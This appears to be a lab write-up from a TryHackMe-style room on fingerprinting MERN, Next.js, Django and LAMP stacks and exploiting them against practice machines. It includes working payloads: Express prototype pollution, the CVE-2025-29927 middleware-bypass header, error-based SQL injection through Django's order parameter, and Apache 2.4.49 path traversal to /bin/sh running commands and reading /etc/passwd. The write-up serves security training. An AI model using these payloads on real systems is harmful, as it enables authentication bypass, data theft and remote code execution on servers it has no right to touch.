# 📌 Modern Web Stacks

## Introduction

You should have an understanding of the following rooms before starting:

- Identify a web stack from passive HTTP signals (headers, cookie names, error pages, URL structure) without sending exploit payloads
- Exploit CVE-2025-29927 to bypass Next.js middleware authentication
- Exploit CVE-2021-35042 to extract database contents from a Django application
- Exploit CVE-2021-41773 to read arbitrary files and execute system commands via mod_cgi on Apache 2.4.49


## MERN Stack

**MERN** applications are everywhere. The stack (MongoDB, Express.js, React, Node.js) powers a large share of modern SaaS products, internal tools, and API backends. Express is the most-deployed Node.js web framework by a significant margin, and its minimal philosophy means developers write a lot of their own utility code. That utility code is often where the vulnerabilities live.

### Stack Identity

MERN apps are the default choice for JavaScript-only shops that want one language across the full stack. On Ubuntu, the typical deployment is Node.js from the NodeSource PPA, Express listening on port 3000 or 5000, and MongoDB on port 27017. A reverse proxy (usually Nginx) sits in front in production, but in misconfigured environments and internal tools, the Express process is often directly exposed.

### Fingerprinting the MERN Stack

**Before touching any exploit payloads, identify what you are dealing with. Start with a header check:**

```bash
root@tryhackme:~# curl -I MACHINE_IP:3000/
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 68
ETag: W/"44-0T374IjVuBCKvVq78aQtpBIvD2A"
Set-Cookie: connect.sid=s%3A2PyC5xblQ3G0ERkE60uOUddRtPs2jacn.0gAB6ByfrNg3b48tDXARTEBQG0pLlKkBofAsa69W%2FY0; Path=/; HttpOnly
Date: Sun, 03 May 2026 15:00:23 GMT
Connection: keep-alive
Keep-Alive: timeout=5
```

Look for these in the response:

| Signal |	Value |	Confidence |
|--|--|--|
| X-Powered-By header |	Express |	High
| Set-Cookie header |	connect.sid=s%3A... |	High
| Unhandled route response |	Cannot GET /nonexistent (plain text) |	High
| Frontend root element |	In the HTML body |	Medium


To confirm the Express unhandled-route fingerprint, request a nonexistent path from the AttackBox terminal:

```bash
root@tryhackme:~# curl http://10.48.146.223:3000/nonexistent
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Cannot GET /nonexistent</pre>
</body>
</html>
```

An Express app with default settings returns plain text: Cannot GET /nonexistent. This is distinct from Django (which shows an HTML error page), Apache (which shows a styled 403 or 404), and Next.js (which returns an HTML page with a styled error). That plain-text response is unambiguous.


### Exploiting MERN

The app on port 3000 exposes two endpoints relevant to this task:

| Endpoint	| Method |	Purpose |
|--|--|--|
| /api/user/update |	POST |	Accepts JSON and merges it into the session user object |
| /api/admin/flag |	GET |	Returns a flag if the requesting user has admin access |

-c cookies.txt -->> Write / Save cookies (Create a Cookie Jar).
This tells curl to take any cookies sent by the web server (via the Set-Cookie header) and write them down into the specified file (cookies.txt). It acts like a browser saving your session token after you hit a website.

-b cookies.txt -->> Read / Send cookies (Use the Cookie Jar).
This tells curl to open your saved file (cookies.txt), grab the cookies stored inside, and pass them along in the HTTP request header to the server. This allows you to maintain your session (e.g., staying logged in as the same user) on your next requests.

```bash
root@tryhackme:~# curl -c cookies.txt http://10.48.146.223:3000/
MERN Lab App
root@tryhackme:~# curl -b cookies.txt http://10.48.146.223:3000/api/admin/flag
{"error":"Not authorized"}
```

💡 Analogy to Remember Them:
-c stands for Cookie jar (where you store them).
-b stands for Biscuit/Cookie board (where you read or load them from).

```bash
root@tryhackme:~# curl -b cookies.txt -X POST http://10.48.146.223:3000/api/user/update -H "Content-Type: application/json" -d '{"name": "Alice", "email":"alice@example.com"}'
{"status":"updated"}
```

### Getting Admin Flag

**Step 1: Send the Prototype Pollution Payload**

```bash
root@tryhackme:~# curl -b cookies.txt -X POST http://10.48.146.223:3000/api/user/update -H "Content-Type: application/json" -d '{"__proto__": {"isAdmin": true}}'
{"status":"updated"}
```

alternative: **```{"constructor": {"prototype": {"isAdmin": true}}}```**

The server responds with {"status":"updated"}. The merge has run and Object.prototype.isAdmin is now true in the Node.js process.

**Step 2: Request the Admin Flag**

```bash
root@tryhackme:~# curl -b cookies.txt http://10.48.146.223:3000/api/admin/flag
{"flag":"[REDACTED]"}
```

The isAdmin check resolves true via the prototype chain, and the response contains the flag.
This is one of the many techniques that can be used to exploit modern web stacks.


## React / Next.js

### Stack Identity

### React Server Components and the Flight Protocol

### Fingerprinting Next.js

Start with passive fingerprinting. No exploit payloads yet.

```bash
root@tryhackme:~# curl -I http://10.48.146.223:3001/
HTTP/1.1 200 OK
Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
x-nextjs-cache: HIT
x-nextjs-prerender: 1
x-nextjs-stale-time: 4294967294
X-Powered-By: Next.js
Cache-Control: s-maxage=31536000,
ETag: "1pqu4ojvif3at"
Content-Type: text/html; charset=utf-8
Content-Length: 4277
Connection: keep-alive
```

Once done, look for the following patterns:

| Signal	| Value	Confidence |
|--|--|--|
| X-Powered-By header |	Next.js |	High |
| **HTML source** |	**window.__next_f  in script tag** |	**High (confirms App Router)** |
| Static asset paths |	/_next/static/chunks/ |	High |
| Middleware headers |	x-middleware-next or x-middleware-rewrite |	Medium |
| Redirect to protected route |	HTTP 307 to /login |	Medium |


### CVE-2025-29927: Middleware Bypass
In Next.js, middleware is a function that runs before every request reaches a page. Developers use it as the central gatekeeper; authentication checks, session validation, and redirect logic all live here. Because middleware sits in front of every route, it is the single most common place developers implement access control in Next.js applications.

The /dashboard route in this app is a typical example. The middleware checks for a valid session cookie. Without one, it redirects to /login. Let us confirm that it is working:

```bash
root@tryhackme:~# curl -v http://10.48.146.223:3001/dashboard
Trying 10.48.146.223:3001...
Connected to 10.48.146.223 port 3001
GET /dashboard HTTP/1.1
Host: 10.48.146.223:3001
Accept: /
/login
```


Middleware is working. No cookie, no dashboard, the server sends us straight to /login.

Now for the vulnerability. Next.js uses an internal header called x-middleware-subrequest to prevent infinite loops. When middleware calls itself recursively (for example, to forward a modified request to another route), Next.js attaches this header so it knows not to run middleware again on that forwarded request. It is a performance and safety mechanism built into the framework itself.

The critical flaw: Next.js never checked whether x-middleware-subrequest was coming from an internal process or from an external client. If you include the header in your own request, Next.js treats it the same as an internal subrequest and skips middleware entirely. The authentication check never runs.

The header value encodes the middleware module path, repeated five times. For an app with a root-level middleware.ts file:

```bash
root@tryhackme:~# curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" http://10.48.146.223:3001/dashboard
...
DashboardFlag: [REDACTED]
...
```

The middleware check is bypassed entirely. The request is routed directly to the dashboard page handler, which returns the flag.

This is CVE-2025-29927, a CVSS 9.1 Critical. Every Next.js application that relied on middleware for authentication was exposed to complete authentication bypass with a single header. No credentials, no brute force, no session token, just a header value that Next.js itself trusted without validation.


Info: If the app uses a /src directory structure, the header value changes to src/middleware repeated five times. Always check whether middleware.ts lives at the project root or inside src/.

### CVE-2025-55182: Practise in a Dedicated Room

CVE-2025-55182 is an unauthenticated RCE via insecure deserialisation in the RSC Flight protocol parser. It affects Next.js 14 (>= 14.3.0-canary.77) and Next.js 15.x (< 15.2.3) when paired with React 19, requires no authentication, and carries a CVSS score of 10.0 Critical. Jackpot Panda expanded from initial id/whoami reconnaissance to credential theft and Cobalt Strike staging within the same exploitation wave as CVE-2025-29927.

A dedicated room with a full exploit walkthrough, weaponised payload analysis, and detection coverage is available here: CVE-2025-55182: React2Shell.

That room covers the Flight protocol deserialisation flaw in depth, walks through the exploit chain from probe to command execution, and includes the detection and remediation perspective that is out of scope for this fingerprinting-focused task.

## Django

### Stack Identity

Django powers a large share of Python-backed web applications. On Ubuntu, it runs under Gunicorn or Django's built-in development server, typically on port 8000. The Django admin panel at /admin/ and CSRF middleware are enabled by default in virtually every Django project. The admin panel alone is a reliable stack signal before you send a single exploit payload.

### Fingerprinting Django


```bash
root@tryhackme:~# curl -I "http://10.82.95.115:8000/products/"
HTTP/1.1 200 OK
Date: Sun, 03 May 2026 14:33:20 GMT
Server: WSGIServer/0.2 CPython/3.10.12
Content-Type: text/html; charset=utf-8
X-Frame-Options: DENY
Vary: Cookie
Content-Length: 407
X-Content-Type-Options: nosniff
Referrer-Policy: same-origin
Set-Cookie:  csrftoken=9vMaeHlURA0uOYnP9qB2BrDNTvNPoD0JPyecxWNxV7aohswgtAtBvwbLWaOTYIF7; expires=Sun, 02 May 2027 14:33:20 GMT; Max-Age=31449600; Path=/; SameSite=Lax
```

Once done, look for the following patterns:

| Signal |	Value |	Confidence |
|--|--|--|
| Server header |	WSGIServer/0.2 CPython/X.X.X |	High
| Cookie name	| csrftoken |	High
| X-Frame-Options header |	DENY |	High
| X-Content-Type-Options header |	nosniff |	High
| Referrer-Policy header | same-origin |	Medium
| HTML source (any POST form) |	csrfmiddlewaretoken hidden field |	High

The **csrfmiddlewaretoken** hidden field is the most reliable Django fingerprint. Django's CsrfViewMiddleware injects it into every POST form automatically. Browse to /admin/ and view source; it is always there. You will not find this field in Express, Rails, or any Next.js application.

The combination of X-Frame-Options: DENY, X-Content-Type-Options: nosniff, and Referrer-Policy: same-origin appearing together signals Django's SecurityMiddleware. No other framework applies this combination by default.

### Exploitation Walkthrough

**Step 1: Extract MySQL Version**


Confirm the injection is working by extracting a known value: the database version. The @@version system variable is always available and gives you an immediate confirmation that your payload is executing. The 500 error response also reveals the Django version in its debug output:

```bash
root@ip-10-82-126-238:~# curl -s "http://10.48.135.222:8000/products/?order=updatexml(1,concat(0x7e,(select%20@@version)),1)" | grep -o '~[0-9][^&]*'
~8.0.45-0ubuntu0.22.04.1
```

The ~ prefix confirms your payload executed and the database responded. You are injecting into MySQL 8.0. The same 500 error page also contains Django Version: 3.2.4 in the debug output.



**Step 2: Extract the Database Name**

Now find out which database the application is using:

```bash
root@ip-10-82-126-238:~# curl -s "http://10.48.135.222:8000/products/?order=updatexml(1,concat(0x7e,(select%20database())),1)" | grep -o '~[0-9a-zA-Z_][^&]*'
~vuln_db
```

The target database is vuln_db. This is just an example, and we can provide this information to tools like Sqlmap to further exploit and dump the database.

## LAMP

**LAMP (Linux, Apache, MySQL, PHP)** is one of the earliest and most widely adopted web application stacks. It became popular because all its components are open-source, stable, and easy to deploy. Linux provides the operating system, Apache handles web requests, MySQL manages the database, and PHP processes dynamic content. For years, it powered much of the internet, including blogs, forums, and enterprise apps. Even today, many legacy systems and production environments still rely on LAMP due to its simplicity and reliability.

### Stack Identity

On Ubuntu, Apache usually runs under www-data, serves files from /var/www/html, and passes dynamic requests to PHP through mod_php or PHP-FPM. MySQL stores the application data, while PHP handles server-side logic. This classic Linux, Apache, MySQL, and PHP combination creates common attack surfaces such as exposed PHP files, database errors, weak file permissions, and misconfigured Apache/PHP settings.

### Fingerprinting the LAMP Stack

Start with a header check. Apache advertises its version in every response:

```bash
root@tryhackme:~# curl -I http://10.48.178.13:8080/
HTTP/1.1 200 OK
Server: Apache/2.4.49 (Unix)
Last-Modified: Mon, 11 Jun 2007 18:53:14 GMT
ETag: "2d-432a5e4a73a80"
Accept-Ranges: bytes
Content-Length: 45
Content-Type: text/html
```

Server: Apache/2.4.49 (Unix) is everything you need. This exact version maps to CVE-2021-41773(opens in new tab) and nothing else. Apache also repeats the version in 404 error page footers. Request a non-existent path to confirm:

```bash
root@tryhackme:~# curl -v http://10.48.178.13:8080/nonexistent 2>&1
*   Trying 10.48.178.13:8080...
* TCP_NODELAY set
* Connected to 10.48.178.13 (10.82.95.115) port 8080 (#0)
> GET /nonexistent HTTP/1.1
> Host: 10.48.178.13:8080
> User-Agent: curl/7.68.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 404 Not Found
< Date: Sat, 02 May 2026 21:16:56 GMT
< Server: Apache/2.4.49 (Unix)
< Content-Length: 196
< Content-Type: text/html; charset=iso-8859-1
<
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
</body></html>
* Connection #0 to host 10.48.178.13 left intact
```


The final signal is /cgi-bin/. A 403 Forbidden means the directory exists, and listing is disabled. mod_cgi is configured. A 404 would mean it is not present at all. For this exploit, mod_cgi is required:

```bash
root@tryhackme:~# curl -v http://10.48.178.13:8080/cgi-bin/ 2>&1
*   Trying 10.82.95.115:8080...
* TCP_NODELAY set
* Connected to 10.48.178.13 (10.82.95.115) port 8080 (#0)
> GET /cgi-bin/ HTTP/1.1
> Host: 10.48.178.13:8080
> User-Agent: curl/7.68.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 403 Forbidden
< Date: Sat, 02 May 2026 21:19:21 GMT
< Server: Apache/2.4.49 (Unix)
< Content-Length: 199
< Content-Type: text/html; charset=iso-8859-1
<
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access this resource.</p>
</body></html>
* Connection #0 to host 10.48.178.13 left intact
```

Once done, look for the following patterns:

| Signal |	Value |	Confidence |
|--|--|--|
| Server header |	Apache/2.4.49 (Unix) |	High - exact CVE match |
| 404 error page footer |	Apache/2.4.49 version string |	High |
| /cgi-bin/ response |	403 Forbidden (not 404) |	High - mod_cgi enabled |


### Exploitation

You have confirmed Apache 2.4.49 on port 8080, with mod_cgi enabled on /cgi-bin/. You have a direct path to unauthenticated RCE.

**Step 1: Confirm Remote Code Execution**

Traverse from /cgi-bin/ up to /bin/sh using four .%2e/ segments. Pass shell commands in the POST body. The echo Content-Type: text/plain; echo; preamble is required by the CGI spec. Apache needs a valid HTTP header block before the body, or it returns a 500. The bare echo outputs the required blank separator line:

```bash
root@tryhackme:~# curl -s --path-as-is "http://10.48.178.13:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"   --data 'echo Content-Type: text/plain; echo; id'
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

RCE confirmed. The Apache process is running as daemon. You have code execution on the server with the privileges of the web process.

**Step 2: Read System Accounts**

With code execution, you can read any file the daemon user can access. Read /etc/passwd to enumerate system accounts inside the container:

```bash
root@tryhackme:~# curl -s --path-as-is "http://10.48.178.13:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"   --data 'echo Content-Type: text/plain; echo; cat /etc/passwd'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
...
```

The first non-root account is the daemon account, which is the same user running the Apache process. This confirms the server is not running as root.

**Step 3: Read the Flag**

```bash
root@tryhackme:~# curl -s --path-as-is "http://10.48.178.13:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"   --data 'echo Content-Type: text/plain; echo; cat /flag.txt'
[REDACTED]
```

## Automation

### Scanning All Four Stacks

Run **Nikto** against each port in turn: MERN on port 3000, Next.js on port 3001, Django on port 8000, and Apache on port 8080.

#### Port 3000 - MERN Stack

```bash
root@tryhackme:~# nikto -h http://10.48.178.13:3000

- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.48.178.13
+ Target Hostname:    10.48.178.13
+ Target Port:        3000
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ Cookie connect.sid created without the httponly flag
+ Retrieved x-powered-by header: Express
+ The anti-clickjacking X-Frame-Options header is not present.
+ Uncommon header 'content-security-policy' found, with contents: default-src 'none'
+ Allowed HTTP Methods: GET, HEAD
+ 6544 items checked: 0 error(s) and 7 item(s) reported on remote host
---------------------------------------------------------------------------
+ 1 host(s) tested
```

No Server: banner; Express does not send one by default. Two signals confirm the stack: x-powered-by: Express and the connect.sid session cookie. The missing httponly flag on the session cookie is a bonus finding.


#### Port 3001 - Next.js

```bash
root@tryhackme:~# nikto -h http://10.48.178.13:3001

- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.48.178.13
+ Target Hostname:    10.48.178.13
+ Target Port:        3001
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ Retrieved x-powered-by header: Next.js
+ Uncommon header 'x-nextjs-stale-time' found, with contents: 4294967294
+ Uncommon header 'x-nextjs-cache' found, with contents: HIT
+ Uncommon header 'x-nextjs-prerender' found, with contents: 1
+ Allowed HTTP Methods: HEAD
+ 6544 items checked: 0 error(s) and 19 item(s) reported on remote host
---------------------------------------------------------------------------
+ 1 host(s) tested
```

x-powered-by: Next.js confirms the framework. The three x-nextjs-* headers confirm that the App Router is in production mode, the condition required for CVE-2025-29927 to apply.


#### Port 8000 - Django

```bash
root@tryhackme:~# nikto -h http://10.48.178.13:8000

- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.48.178.13
+ Target Hostname:    10.48.178.13
+ Target Port:        8000
---------------------------------------------------------------------------
+ Server: WSGIServer/0.2 CPython/3.10.12
+ Uncommon header 'referrer-policy' found, with contents: same-origin
+ Uncommon header 'x-content-type-options' found, with contents: nosniff
+ 6544 items checked: 0 error(s) and 4 item(s) reported on remote host
---------------------------------------------------------------------------
+ 1 host(s) tested
```

WSGIServer/0.2 CPython/3.10.12 is a Django-specific server banner. The combination of referrer-policy: same-origin and x-content-type-options: nosniff together confirm Django's SecurityMiddleware is active.


#### Port 8080 - Apache

```bash
root@tryhackme:~# nikto -h http://10.48.178.13:8080

- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.48.178.13
+ Target Hostname:    10.48.178.13
+ Target Port:        8080
---------------------------------------------------------------------------
+ Server: Apache/2.4.49 (Unix)
+ Server leaks inodes via ETags, header found with file /
+ The anti-clickjacking X-Frame-Options header is not present.
+ Allowed HTTP Methods: HEAD, GET, POST, OPTIONS, TRACE
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ 6544 items checked: 0 error(s) and 4 item(s) reported on remote host
+ End Time: (9 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Server: Apache/2.4.49 (Unix) is a direct CVE-2021-41773 indicator. This is the most valuable finding Nikto produces across all four scans: an exact version number that maps to a known critical exploit.

Nikto identified the stack on every port in under a minute. For Apache, it also gave you the exact version, no further fingerprinting needed. For MERN and Django, the stack is confirmed, but Nikto has no templates for application-level injection flaws. That is where the manual techniques from Tasks 2 and 4 take over.


## Conclusion

#### CVE Summary

| Stack |	CVE |	Impact	| CVSS |
|--|--|--|--|
| MERN / Express |	CVE-2020-8203 |	Prototype pollution → auth bypass |	7.4 High |
| Next.js Middleware |	CVE-2025-29927 |	Single header → full middleware bypass |	9.1 Critical |
| Django ORM |	CVE-2021-35042 |	SQL injection via unparameterised ORDER BY |	9.8 Critical |
| Apache LAMP |	CVE-2021-41773 |	Path traversal + mod_cgi RCE |	9.8 Critical |
